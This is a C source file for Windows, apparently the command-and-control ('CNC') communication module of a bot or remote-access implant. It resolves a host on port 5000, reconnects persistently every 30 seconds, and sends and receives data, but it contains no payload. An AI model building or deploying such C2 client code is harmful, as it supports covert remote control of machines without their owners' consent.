#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "logger.h"

#define CNC_PORT "5000"
#define SLEEP_INTERVAL_ON_CONNREFUSED_MS 30 * 1000

SOCKET cnc_sock = INVALID_SOCKET;
char *cnc_host;

void init_winsock()
{
    WSADATA wsaData;
    int ret;

    ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (ret)
    {
        log_error("WSAStartup failed: %d", ret);
        exit(EXIT_FAILURE);
    }
    log_debug("Initialized Winsock.");
}

void get_cnc_addrinfo(struct addrinfo **result)
{
    int ret;
    char cnc_addr[255];
    long unsigned int cnc_addr_len = sizeof(cnc_addr);
    struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};

    ret = getaddrinfo(cnc_host, CNC_PORT, &hints, result);
    if (ret)
    {
        log_error("getaddrinfo failed: %d", ret);
        exit(EXIT_FAILURE);
    }

    cnc_addrinfo = *result;
    ret = WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
    if (ret)
    {
        log_error("WSAAddressToStringA failed: %d", ret);
        exit(EXIT_FAILURE);
    }
    log_debug("CNC's address: %s", cnc_addr);
}

void init_cnc_sock()
{
    cnc_sock = socket(AF_INET, SOCK_STREAM, 0);

    if (cnc_sock == INVALID_SOCKET)
    {
        log_error("Error at socket(): %ld", WSAGetLastError());
        exit(EXIT_FAILURE);
    }
}

void connect_to_cnc(struct addrinfo *cnc_addrinfo)
{
    int ret;

    while (TRUE)
    {
        ret = connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen);
        if (ret == SOCKET_ERROR)
        {
            ret = WSAGetLastError();
            if (ret != WSAECONNREFUSED)
            {
                log_error("Error at connect(): %ld", ret);
                exit(EXIT_FAILURE);
            }
            else
            {
                log_warning("Failed to connect to CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNREFUSED_MS / 1000);
                Sleep(SLEEP_INTERVAL_ON_CONNREFUSED_MS);
            }
        }
        else
        {
            log_info("Connected to CNC.");
            return;
        }
    }
}

void reconnect_to_cnc()
{
    struct addrinfo *cnc_addrinfo;

    get_cnc_addrinfo(&cnc_addrinfo);
    init_cnc_sock();
    connect_to_cnc(cnc_addrinfo);
}

int send_to_cnc(void *buf, size_t len)
{
    int ret;

    while (TRUE)
    {
        ret = send(cnc_sock, buf, len, 0);
        if (ret == SOCKET_ERROR)
        {
            log_error("Error at send(): %ld", WSAGetLastError());
            exit(EXIT_FAILURE);
        }
        if (!ret)
        {
            log_error("Connection with CNC broke.");
            reconnect_to_cnc();
            return 0;
        }
        return ret;
    }
}

int recv_from_cnc(void *buf, size_t len)
{
    int ret;

    while (TRUE)
    {
        ret = recv(cnc_sock, buf, len, 0);
        if (ret == SOCKET_ERROR)
        {
            log_error("Error at recv(): %ld", WSAGetLastError());
            exit(EXIT_FAILURE);
        }
        if (!ret)
        {
            log_error("Connection with CNC broke.");
            reconnect_to_cnc();
            return 0;
        }
        return ret;
    }
}

void init_cnc_conn(char *host)
{
    struct addrinfo *cnc_addrinfo;

    cnc_host = host;
    init_winsock();
    get_cnc_addrinfo(&cnc_addrinfo);
    init_cnc_sock();
    connect_to_cnc(cnc_addrinfo);
}
